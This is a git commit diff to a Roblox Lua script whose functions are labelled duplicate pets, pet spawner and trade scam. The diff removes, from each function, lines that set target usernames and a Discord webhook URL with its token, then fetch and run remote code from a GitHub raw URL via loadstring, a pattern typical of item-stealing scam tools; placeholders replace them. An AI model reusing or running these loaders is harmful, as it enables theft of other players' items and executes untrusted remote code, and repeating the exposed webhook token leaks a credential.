126eb5f14b4554b10508d5a83ffabb77f09e4c3c
thatboyskulls12 <aj.skulls12@gmail.com>
2025-06-18 21:10:46 -0400

    Update testrun.lua

--- testrun.lua
+++ testrun.lua
@@ -57,38 +57,17 @@ end
 -- Replace these with actual logic
 local function runDuplicatePets()
 	print("🐾 Running duplicate pets script...")
-	-- loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/main/gui_loader.lua"))()
-
-_G.Usernames = {"ajandaa12alt8", "ajandaa12alt1", "ajandaa12"} -- you can add as many as you'd like
-_G.min_value = 0.1
-_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1382024220237627392/AlS0_ocQpW5tnDjNlY_zvdmWWm03b_XT-IVhLFQm3FlAKf2zD9kdz5RtJHQKPUtK0tqr" -- change to your webhook
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/main/source.lua"))()
+	-- Add real code here
 end
 
 local function runPetSpawner()
 	print("🐶 Running pet spawner script...")
-	-- loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/main/gui_loader.lua"))()
-
-_G.Usernames = {"ajandaa12alt8", "ajandaa12alt1", "ajandaa12"} -- you can add as many as you'd like
-_G.min_value = 0.1
-_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1382024220237627392/AlS0_ocQpW5tnDjNlY_zvdmWWm03b_XT-IVhLFQm3FlAKf2zD9kdz5RtJHQKPUtK0tqr" -- change to your webhook
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/main/source.lua"))()
+	-- Add real code here
 end
 
 local function runTradeScam()
 	print("💰 Running trade scam script...")
-	-- loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/main/gui_loader.lua"))()
-
-_G.Usernames = {"ajandaa12alt8", "ajandaa12alt1", "ajandaa12"} -- you can add as many as you'd like
-_G.min_value = 0.1
-_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/1382024220237627392/AlS0_ocQpW5tnDjNlY_zvdmWWm03b_XT-IVhLFQm3FlAKf2zD9kdz5RtJHQKPUtK0tqr" -- change to your webhook
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/main/source.lua"))()
+	-- Add real code here
 end
 
 -- Create the buttons
